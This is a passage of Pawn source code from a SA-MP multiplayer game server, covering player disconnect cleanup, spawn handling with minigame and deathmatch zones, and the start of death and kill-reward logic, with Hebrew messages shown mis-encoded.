		SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world_normal);
		DisablePlayerRaceCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerinfo[playerid][dinvited]);
		playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
		playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
		playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dplace] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
	}
	dbg(4,"6");
	if(playerinfo[playerid][bacc] && levels[playerinfo[playerid][level]][BankLimit] != 0)
	{
		if(playerinfo[playerid][bank] > levels[playerinfo[playerid][level]][BankLimit])
		{
			playerinfo[playerid][bank] = levels[playerinfo[playerid][level]][BankLimit];
			if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
		}
	}
	dbg(4,"7");
	if(levels[playerinfo[playerid][level]][AmmoLimit] != 0)
	{
		for(new i=0;i<7;i++)
		{
			if(playerinfo[playerid][ammo][i] > levels[playerinfo[playerid][level]][AmmoLimit])
			{
				playerinfo[playerid][ammo][i] = levels[playerinfo[playerid][level]][AmmoLimit];
				if(playerinfo[playerid][logged])
				{
					format(string,sizeof(string),"Ammo%d",i);
					fsetint(fuser(playerid),string,playerinfo[playerid][ammo][i]);
				}
			}
		}
	}
	dbg(4,"8");
	if(playerinfo[playerid][inrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		raceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(raceinfo[1] < 3) EndRace(" çåñø ùç÷ðéí",-1);
	}
	if(playerinfo[playerid][inwar])
	{
		warinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitwar] = 0, playerinfo[playerid][inwar] = 0, playerinfo[playerid][warid] = 0;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1084,0.0,0.0,0.0);
		if(warinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inwar])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~war~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !ðéöç áîìçîú äùøú %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					SpawnPlayer(i);
					GiveMoney(i,30000);
					playerinfo[i][inwar] = 0, playerinfo[i][waitwar] = 0, playerinfo[i][warid] = 0;
					playerinfo[i][inact] = 0;
					warinfo[0] = 0, warinfo[1] = 0, warinfo[2] = 0, warinfo[5] = 0;
					playerinfo[i][bonus][3]++;
					if(playerinfo[i][bonus][3] == 5)
					{
						SendClientMessage(i,orange," .òì ëê ùðéöçú á5 îìçîåú ùøú ÷éáìú 50000$");
						GiveMoney(i,50000);
						playerinfo[i][bonus][3] = 0;
					}
					KillTimer(warinfo[3]);
					PlayerPlaySound(i,1084,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][inwwe])
	{
		playerinfo[playerid][waitwwe] = 0, playerinfo[playerid][inwwe] = 0, playerinfo[playerid][wweid] = 0;
		wweinfo[1]--;
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		SetPlayerInterior(playerid,0);
		playerinfo[playerid][inact] = 0;
		for(new i=0;i<2;i++) wwejoins[i] = INVALID_PLAYER_ID;
		PlayerPlaySound(playerid,1069,0.0,0.0,0.0);
		if(wweinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i))
				{
					if(playerinfo[i][inwwe])
					{
						format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~b~wwe~w~!",GetName(i));
						MovingText(string,mt_activity);
						format(string,sizeof(string)," !WWE ðéöç áúçøåú ä %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						SetPlayerInterior(i,0);
						SpawnPlayer(i);
						GiveMoney(i,10000);
						playerinfo[i][inwwe] = 0, playerinfo[i][waitwwe] = 0, playerinfo[i][wweid] = 0;
						playerinfo[i][inact] = 0;
						wweinfo[0] = 0, wweinfo[1] = 0, wweinfo[2] = 0, wweinfo[4] = 0;
						KillTimer(wweinfo[3]);
						PlayerPlaySound(i,1069,0.0,0.0,0.0);
					}
					else if(playerinfo[i][viewerwwe])
					{
						playerinfo[i][viewerwwe] = 0;
						TogglePlayerSpectating(i,0);
						SendClientMessage(i,yellow," !î÷ååéí ùðäðú ìöôåú");
						PlayerPlaySound(i,1069,0.0,0.0,0.0);
					}
				}
			}
		}
	}
	if(playerinfo[playerid][inkart])
	{
		playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		DestroyVehicleEx(playerinfo[playerid][kartv]);
		SpawnPlayer(playerid);
		vehicleinfo[playerinfo[playerid][kartv]][kartdriver] = INVALID_PLAYER_ID;
		kartinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
		if(kartinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkart])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Kart ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][kartv]);
					SpawnPlayer(i);
					GiveMoney(i,40000);
					playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
					kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kartinfo[3]);
					PlayerPlaySound(i,1063,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][inmonster])
	{
		playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[playerinfo[playerid][monsterv]][monsterdriver] = INVALID_PLAYER_ID;
		DestroyVehicleEx(playerinfo[playerid][monsterv]);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		monsterinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1086,0.0,0.0,0.0);
		if(monsterinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inmonster])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~p~monster~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Monster ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][monsterv]);
					SpawnPlayer(i);
					GiveMoney(i,25000);
					playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
					monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(monsterinfo[3]);
					PlayerPlaySound(i,1086,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][insrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitsrace] = 0, playerinfo[playerid][insrace] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		sraceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(raceinfo[1] < 3) EndRace(" çåñø ùç÷ðéí",-1);
	}
	if(playerinfo[playerid][inkickstar])
	{
		playerinfo[playerid][waitkickstar] = 0, playerinfo[playerid][inkickstar] = 0, playerinfo[playerid][kickstarid] = -1, playerinfo[playerid][kickstarscore] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		kickstarinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(kickstarinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~~h~kickstar~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Kickstar ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					LinkVehicleToInterior(GetPlayerVehicleID(i),0);
					SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
					DisablePlayerCheckpoint(i);
					SpawnPlayer(i);
					GiveMoney(i,50000);
					playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarscore] = 0;
					kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kickstarinfo[3]);
				}
			}
		}
	}
	if(playerinfo[playerid][waitrace])
	{
		raceinfo[1]--;
		playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][raceid] = 0;
		playerinfo[playerid][inact] = 0;
	}
	if(playerinfo[playerid][waitwar])
	{
		warinfo[1]--;
		playerinfo[playerid][waitwar] = 0, playerinfo[playerid][inwar] = 0, playerinfo[playerid][warid] = 0;
		playerinfo[playerid][inact] = 0;
	}
	if(playerinfo[playerid][waitwwe])
	{
		wweinfo[1]--;
		playerinfo[playerid][waitwwe] = 0, playerinfo[playerid][inwwe] = 0, playerinfo[playerid][wweid] = 0;
		playerinfo[playerid][inact] = 0;
	}
	if(playerinfo[playerid][waitkart])
	{
		kartinfo[1]--;
		DestroyVehicleEx(playerinfo[playerid][kartv]);
		playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
		playerinfo[playerid][inact] = 0;
	}
	if(playerinfo[playerid][waitmonster])
	{
		monsterinfo[1]--;
		DestroyVehicleEx(playerinfo[playerid][monsterv]);
		playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
		playerinfo[playerid][inact] = 0;
	}
	if(playerinfo[playerid][waitsrace])
	{
		sraceinfo[1]--;
		playerinfo[playerid][waitsrace] = 0, playerinfo[playerid][insrace] = 0;
		playerinfo[playerid][inact] = 0;
	}
	if(playerinfo[playerid][waitkickstar])
	{
		kickstarinfo[1]--;
		playerinfo[playerid][waitkickstar] = 0, playerinfo[playerid][inkickstar] = 0, playerinfo[playerid][kickstarid] = -1, playerinfo[playerid][kickstarscore] = 0;
		playerinfo[playerid][inact] = 0;
	}
	dbg(4,"9");
	/*if(playerinfo[playerid][conference] != -1)
	{
		playerinfo[playerid][conference] = -1;
		format(string,sizeof(string)," .ééöà îäùøú åìëï äåà ééöà âí îùéçú äåòéãä %s",GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][conference] == playerid) SendClientMessage(i,green,string);
	}*/
	if(playerinfo[playerid][calling] != -1)
	{
		format(string,sizeof(string)," .ééöà îäùøú åìëï äùéçä ðåú÷ä %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][calling],green,string);
		playerinfo[playerinfo[playerid][calling]][calling] = -1;
		playerinfo[playerinfo[playerid][calling]][canswer] = 0;
		playerinfo[playerinfo[playerid][calling]][callid] = 0;
		playerinfo[playerinfo[playerid][calling]][caller] = 0;
		playerinfo[playerid][calling] = -1;
		playerinfo[playerid][canswer] = 0;
		playerinfo[playerid][callid] = 0;
		playerinfo[playerid][caller] = 0;
	}
	dbg(4,"10");
	if(actinfo[actAdmin] == playerid && actinfo[actExist])
	{
		SendClientMessageToAll(red," .äôòéìåú äéãðéú ðñâøä îäñéáä ùäàãîéï ùôúç àåúä ééöà");
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid)
		{
			SetFreeze(i,0);
			SpawnPlayer(i);
			playerinfo[i][inact] = 0;
		}
		actinfo[actExist] = 0;
		actinfo[actPlayers] = 0;
		actinfo[actMax] = 0;
		actinfo[actName] = 0;
		actinfo[actEndJoin] = 0;
		actinfo[actAdmin] = -1;
		actinfo[actNeedVehicle] = 0;
	}
	dbg(4,"11");
	if(playerinfo[playerid][incrane])
	{
		SetVehicleHealth(GetPlayerVehicleID(playerid),0.0);
		SetFreeze(playerid,0);
		playerinfo[playerid][incrane] = 0, playerinfo[playerid][cranetime] = 0;
		News(" !äîðåó ôðåé");
	}
	if(playerinfo[playerid][wehateyou] != -1) KillTimer(playerinfo[playerid][wehateyou]);
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
	{
	    if(playerinfo[i][clickon] == playerid)
    	{
	    	playerinfo[i][clickon] = -1;
	    	if(playerinfo[i][indialog] >= dialog_clickplayer && playerinfo[i][indialog] <= dialog_baccb) ShowPlayerDialog(i,dialog_ni,DIALOG_STYLE_MSGBOX," äåãòä"," .äùç÷ï ùáçøú ééöà îäùøú åìëï äúôøéè ðñâø","OK","");
	    }
	    if(playerinfo[i][pump] == playerid)
	    {
			SendClientMessage(i,red," .ùàéáú äçééí äåôñ÷ä ëé äùç÷ï îîðå ùàáú ééöà îäùøú");
			playerinfo[i][pump] = INVALID_PLAYER_ID;
		}
	}
	UpdateOnlineAdmins();
	ResetInfo(playerid);
	playerinfo[playerid][pp] = 0;
	dbg(4,"12");
	for(new i=0;i<icons_count;i++) RemovePlayerMapIcon(playerid,i);
	#if DFairPlay == true
		DF_OnPlayerDisconnect(playerid,reason);
	#endif
	dbg(4,"13");
	if(!dontseedc)
	{
		format(string,sizeof(string)," *** %s has left the server. (%s)",GetName(playerid),reas);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][showquit]) SendClientMessage(i,grey,string);
	}
	dbg(4,"14");
	if(lastAdv == playerid) lastAdv = INVALID_PLAYER_ID;
	for(new i = 0; i < 2; i++) if(bottalkingto[i] == playerid)
	{
		bottalkingto[i] = INVALID_PLAYER_ID;
		KillTimer(bottalkingto[2]);
	}
	dbg(4,"15");
	if(debugstate) printf("OnPlayerDisconnect(%s(%d),%d) end",GetName(playerid),playerid,reason);
	return 1;
}
//=[OnPlayerSpawn]==============================================================
public OnPlayerSpawn(playerid)
{
	if(debugstate) printf("OnPlayerSpawn(%s(%d)) start",GetName(playerid),playerid);
    if(IsPlayerNPC(playerid))
    {
        new npcid = GetNPCID(playerid);
        if(npcid == -1) return 1;
        if(NPCs[npcid][npcVehicle])
		{
			PutPlayerInVehicle(playerid,npcVehicles[npcid],NPCs[npcid][npcVehicleSeat]);
			vehicleinfo[npcVehicles[npcid]][locked] = NPCs[npcid][npcVehicleLocked];
		}
		Attach3DTextLabelToPlayer(NPCs[npcid][npcText],playerid,0.0,0.0,0.2);
		SetPlayerSkin(playerid,NPCs[npcid][npcSkin]);
		SetPlayerColor(playerid,rgba2hex(random(256),random(256),random(256),155));
        return 1;
    }
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged]) return SetKick(playerid,INVALID_PLAYER_ID,"ðéñéåï ôøéöä ìîùúîù");
	if(playerinfo[playerid][admlog] == 1)
	{
	    SetFreeze(playerid,1);
	    SendClientMessage(playerid,green," /admlog [password] :àðà ä÷ìã ñéñîú àãîéï");
	}
	SetPlayerWeather(playerid,GetServerVarAsInt("weather"));
	playerinfo[playerid][die] = 0;
	playerinfo[playerid][incrane] = 0;
	if(playerinfo[playerid][wehateyou] != -1) SetPlayerHealth(playerid,0.0);
	for(new i=0;i<7;i++) playerinfo[playerid][death][i] = 0;
	if(playerinfo[playerid][class] == randclass)
	{
		new s = random(300);
		while(!IsValidSkin(s)) s = random(300);
		SetPlayerSkin(playerid,s);
	}
	dbg(5,"1");
	playerinfo[playerid][reqclass] = 0;
	ResetWeapons(playerid);
	SetCameraBehindPlayer(playerid);
	if(playerinfo[playerid][dmzone] == dmz_none)
	{
		if(GetPlayerSkin(playerid) >= 266 && GetPlayerSkin(playerid) <= 274)
		{
			new rnd = random(sizeof(RandomCopSpawns));
			SetPlayerPos(playerid,RandomCopSpawns[rnd][rsX],RandomCopSpawns[rnd][rsY],RandomCopSpawns[rnd][rsZ]);
			SetPlayerFacingAngle(playerid,RandomCopSpawns[rnd][rsA]);
			SetPlayerInterior(playerid,RandomCopSpawns[rnd][rsI]);
		}
		else
		{
			new rnd = random(sizeof(RandomSpawns));
			SetPlayerPos(playerid,RandomSpawns[rnd][rsX],RandomSpawns[rnd][rsY],RandomSpawns[rnd][rsZ]);
			SetPlayerFacingAngle(playerid,RandomSpawns[rnd][rsA]);
			SetPlayerInterior(playerid,RandomSpawns[rnd][rsI]);
		}
		SetPlayerVirtualWorld(playerid,world_normal);
		GiveWeapon(playerid,24,1000);
		for(new i=0;i<10;i++) GiveWeapon(playerid,playerinfo[playerid][weapons][i],i == 9 || i == 8? 1:(GetAmmunationAmmo(playerinfo[playerid][weapons][i])*playerinfo[playerid][ammo][i]));
		GiveWeapon(playerid,0,0);
	}
	else
	{
		switch(playerinfo[playerid][dmzone])
		{
			case dmz_sm, dmz_mm:
			{
				new rnd = random(sizeof(DMZ_RandomSpawns_MMnS));
				SetPlayerPos(playerid,DMZ_RandomSpawns_MMnS[rnd][0],DMZ_RandomSpawns_MMnS[rnd][1],DMZ_RandomSpawns_MMnS[rnd][2]);
				SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_MMnS[rnd][3]);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,playerinfo[playerid][dmzone] == dmz_mm? world_dm_mm:world_dm_sm);
				GiveWeapon(playerid,playerinfo[playerid][dmzone] == dmz_mm? 38:34,100000);
			}
			case dmz_ww:
			{
				new rnd = random(sizeof(DMZ_RandomSpawns_WW));
				SetPlayerPos(playerid,DMZ_RandomSpawns_WW[rnd][0],DMZ_RandomSpawns_WW[rnd][1],DMZ_RandomSpawns_WW[rnd][2]);
				SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_WW[rnd][3]);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,world_dm_ww);
				GiveWeapon(playerid,22,100000);
				SetPlayerSkillLevel(playerid,0,200);
			}
			case dmz_jetp:
			{
				new rnd = random(sizeof(DMZ_RandomSpawns_Jetp));
				SetPlayerPos(playerid,DMZ_RandomSpawns_Jetp[rnd][0],DMZ_RandomSpawns_Jetp[rnd][1],DMZ_RandomSpawns_Jetp[rnd][2]);
				SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_Jetp[rnd][3]);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,world_dm_jetp);
				GiveJetpack(playerid);
				GiveWeapon(playerid,!random(2)? (!random(2)? 28:32):(!random(2)? 22:26),100000);
			}
			case dmz_matrix:
			{
				new rnd = random(sizeof(DMZ_RandomSpawns_Matrix));
				SetPlayerPos(playerid,DMZ_RandomSpawns_Matrix[rnd][0],DMZ_RandomSpawns_Matrix[rnd][1],DMZ_RandomSpawns_Matrix[rnd][2]);
				SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_Matrix[rnd][3]);
				SetPlayerInterior(playerid,15);
				SetPlayerVirtualWorld(playerid,world_dm_matrix);
				GiveWeapon(playerid,24,100000);
			}
			case dmz_rc, dmz_heavy:
			{
				new rnd = random(sizeof(DMZ_RandomSpawns_RCWar));
				SetPlayerPos(playerid,DMZ_RandomSpawns_RCWar[rnd][0],DMZ_RandomSpawns_RCWar[rnd][1],DMZ_RandomSpawns_RCWar[rnd][2]);
				SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_RCWar[rnd][3]);
				SetPlayerInterior(playerid,10);
				SetPlayerVirtualWorld(playerid,playerinfo[playerid][dmzone] == dmz_heavy ? world_dm_heavy : world_dm_rc);
				if(playerinfo[playerid][dmzone] == dmz_heavy)
				{
					GiveWeapon(playerid,24,100000);
					GiveWeapon(playerid,!random(2) ? 27 : 25,100000);
					GiveWeapon(playerid,!random(2) ? 30 : 31,100000);
					GiveWeapon(playerid,!random(2) ? 33 : 34,100000);
					if(!random(5)) GiveWeapon(playerid,!random(2) ? 35 : 16,100000);
				}
				else GiveWeapon(playerid,31,100000);
			}
		}
	}
	dbg(5,"2");
	PlayerPlaySound(playerid,start_sound+1,0.0,0.0,0.0);
	GetPlayerPos(playerid,playerinfo[playerid][startpos][0],playerinfo[playerid][startpos][1],playerinfo[playerid][startpos][2]);
	if(playerinfo[playerid][spawned] == 0)
	{
		new string[M_S];
		#if DFairPlay == true
			new pid[4];
			SendClientMessage(playerid,grey," ...áãé÷ú ö'éèéí, àðà äîúï");
			format(string,sizeof(string),DF_getIncidents());
			valstr(pid,playerid);
			if(strfind(string,pid,true) != -1)
			{
				SendClientMessage(playerid,red," .àéðê éëåì ìäëðñ ìùøú òí äúåëðåú äðåëçéåú àùø ôúåçåú àöìê");
				SetKick(playerid,INVALID_PLAYER_ID,"ö'éèéí");
				return 1;
			}
			SendClientMessage(playerid,green," .áãé÷ú äö'éèéí äåùìîä");
		#endif
		format(string,sizeof(string),"~y~welcome~n~~h~%s",GetName(playerid));
		GameTextForPlayer(playerid,string,3000,1);
		playerinfo[playerid][spawned] = 1;
		if(playerinfo[playerid][showmt]) TextDrawShowForPlayer(playerid,modetxt);
		for(new i=0;i<50;i++) if(MoneyGZ[i] != -1) GangZoneShowForPlayer(playerid,MoneyGZ[i],0x0080FF78);
		//for(new i=0;i<50;i++) if(AntiKillGZ[i] != -1) GangZoneShowForPlayer(playerid,AntiKillGZ[i],0x80FF8096);
		GangZoneShowForPlayer(playerid,viphq[vgangzone],0xFF800096);
		SetPlayerColor(playerid,GetColor(playerid,153));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
		SetPlayerMapIcon(playerid,icon_bank,-22.3137,-55.2263,1003.5468,52,0);
		SetPlayerMapIcon(playerid,icon_wang,2636.8041,-2001.9831,13.5544,55,0);
		SetPlayerMapIcon(playerid,icon_wang2,-1928.9987,272.5292,41.0468,55,0);
		SetPlayerMapIcon(playerid,icon_race,2057.3232,843.6667,6.7031,53,0);
		SetPlayerMapIcon(playerid,icon_lvap,1667.1559,1594.8059,10.8203,5,0);
		SetPlayerMapIcon(playerid,icon_sfap,-1353.9729,-512.2011,14.1719,5,0);
		SetPlayerMapIcon(playerid,icon_lsap,1415.6378,-2497.6167,13.5547,5,0);
		SetPlayerMapIcon(playerid,icon_ships,2293.9980,523.9903,1.7944,9,0);
		SetPlayerMapIcon(playerid,icon_docks,-1655.0560,1299.1433,7.0391,9,0);
		SetPlayerMapIcon(playerid,icon_quarry,671.7627,886.9266,-40.3067,11,0);
		SetPlayerMapIcon(playerid,icon_pirate,2000.7985,1538.2964,13.5859,23,0);
	}
	dbg(5,"3");
	if(!GetMoney(playerid)) GiveMoney(playerid,spawnmoney);
	if(playerinfo[playerid][skin] != 300) SetPlayerSkin(playerid,playerinfo[playerid][skin]);
	SetPlayerHealth2(playerid,100.0);
	if(!playerinfo[playerid][gmtimer])
	{
		SetPlayerHealth2(playerid,100000.0);
		playerinfo[playerid][gmtimer] = 1;
		SetTimerEx("UnGod",1500,0,"df",playerid,100.0);
	}
	playerinfo[playerid][work] = work_none;
	playerinfo[playerid][gwarnings] = 0;
	playerinfo[playerid][lastskin] = GetPlayerSkin(playerid);
	SetPlayerArmour2(playerid,playerinfo[playerid][armour]? 100.0:0.0);
	dbg(5,"4");
	if(debugstate) printf("OnPlayerSpawn(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerDeath]==============================================================
public OnPlayerDeath(playerid, killerid, reason)
{
	if(debugstate) printf("OnPlayerDeath(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetName(killerid),killerid,reason);
	new string[M_S];
	if(playerinfo[killerid][kills] < 0) return Cheat(killerid,"Fake kill");
	dbg(6,"1");
	playerinfo[playerid][die]++;
	if(reason >= 0 && reason <= 46 && !IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][die] > 1 ||
		(GetDistanceBetweenPlayers(playerid,killerid) > 100.0 && reason != 34 && reason != 33 && reason != 31 && reason != 30) ||
		(GetPlayerWeapon(killerid) != reason && (reason >= 0 && reason <= 46) && reason < 19 && reason > 21)) playerinfo[playerid][fkwarns]++;
		if(playerinfo[playerid][fkwarns] >= 5)
		{
			playerinfo[killerid][kills] -= 5;
			Cheat(playerid,"Fake kill");
			return 1;
		}
	}
	if(reason == 51 && killerid != INVALID_PLAYER_ID && (GetPlayerWeapon(killerid) == 35 || GetPlayerWeapon(killerid) == 36 || GetPlayerWeapon(killerid) == 16)) reason = GetPlayerWeapon(killerid);
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][pump] == playerid)
	{
		SendClientMessage(i,red," .äøâú àú äùç÷ï îîðå ùàáú");
		playerinfo[i][pump] = INVALID_PLAYER_ID;
		killerid = i, reason = 53;
	}
	SendDeathMessage(killerid,playerid,reason);
	dbg(6,"2");
	if(GetPlayerCheckpoint(playerid) == cp_bank || GetPlayerCheckpoint(playerid) == cp_ammu)
	{
	    SendClientMessage(playerid,green," .îôðé ùäøâå àåúê ááð÷ / áçðåú ðù÷é, ëñôê ðùàø àöìê");
	    SendClientMessage(killerid,red," .îòøëú äùøú æéäúä ëé äøâú áçðåú ðù÷éí / ááð÷ åìëï äåöàú îäùøú");
	    return SetKick(killerid,INVALID_PLAYER_ID,GetPlayerCheckpoint(playerid) == cp_bank ? ("äøéâä ááð÷") : ("äøéâä áçðåú ðù÷éí"));
	}
	if(killerid != INVALID_PLAYER_ID)
	{
		GiveMoney(killerid,GetMoney(playerid));
		if(playerinfo[killerid][dmzone] == dmz_mm)
		{
			if(playerinfo[killerid][sb] == 6)
			{
				playerinfo[killerid][kills]++;
				SendClientMessage(playerid,orange," .ðåñôä ìê äøéâä òì çéñåì áàéæåø ãé-àí");
			}
			else
			{
				if(playerinfo[killerid][dmzkills] == 5)
				{
					playerinfo[killerid][dmzkills] = 0, playerinfo[killerid][kills]++;
					if(playerinfo[killerid][logged]) fsetint(fuser(killerid),"Kills",playerinfo[killerid][kills]);
					SendClientMessage(killerid,orange," .òì ëê ùäøâú 5 ùç÷ðéí áàéæåø ãé-àí ÷éáìú äøéâä");
				}
			}
		}
		if(playerinfo[playerid][hitman] > 0)
		{
			GiveMoney(killerid,playerinfo[playerid][hitman]);
			playerinfo[playerid][hitman] = 0;
		}
		if(playerinfo[killerid][dmzone] != dmz_mm)
		{
			new bool:dontChange=false;
			if(!IsPlayerInAnyVehicle(killerid) && playerinfo[playerid][dmzone] != dmz_rc)
			{
				new noobWeapons[] = {16,18,10,20,35,36,37,38,39,51};
				for(new i=0;i<sizeof(noobWeapons);i++) if(reason == noobWeapons[i]) dontChange = true;
				if(!dontChange)
				{
					playerinfo[killerid][kills]++;
					if(x2kills) playerinfo[killerid][kills]++;
					if(playerinfo[killerid][sb] >= 1 && playerinfo[killerid][sb] <= 3)
					{
						new rnd = -1;
						switch(playerinfo[killerid][sb])
						{
							case 1: rnd = random(4);
							case 2: rnd = random(2);
							case 3: rnd = 0;
						}
						if(!rnd)
						{
							playerinfo[killerid][kills]++;
							SendClientMessage(killerid,orange," !÷éáìú äøéâä ðåñôú");
						}
					}
					if(playerinfo[killerid][sb] >= 5 && playerinfo[killerid][sb] <= 5)
					{
						new rnd = playerinfo[playerid][sb] == 4 ? random(2) : 0;
						if(!rnd)
						{
							playerinfo[killerid][kills] += 2;
							SendClientMessage(killerid,orange," !÷éáìú 2 äøéâåú ðåñôåú");
						}
					}
					if(playerinfo[killerid][logged]) fsetint(fuser(killerid),"Kills",playerinfo[killerid][kills]);
					playerinfo[playerid][bonus][0] = 0, playerinfo[killerid][bonus][0]++;
				}
				dontChange = true;
			}
			if(!playerinfo[playerid][inact])
			{
				if(levels[playerinfo[killerid][level]][DeathHealth] > 0.0)
				{
					new Float:h[2];
					GetPlayerHealth(killerid,h[0]);
					h[1] = levels[playerinfo[killerid][level]][DeathHealth]+h[0];
					SetPlayerHealth2(killerid,h[1] > 100.0? 100.0:h[1]);
				}
				if(levels[playerinfo[killerid][level]][DeathArmour] > 0.0)
				{
					new Float:a[2];
					GetPlayerArmour(killerid,a[0]);
					a[1] = levels[playerinfo[killerid][level]][DeathArmour]+a[0];
					SetPlayerArmour2(killerid,a[1] > 100.0? 100.0:a[1]);
				}
			}
			if(playerinfo[killerid][bonus][0] > 1 && !dontChange)
			{
				GiveMoney(killerid,100*playerinfo[killerid][bonus][0]);
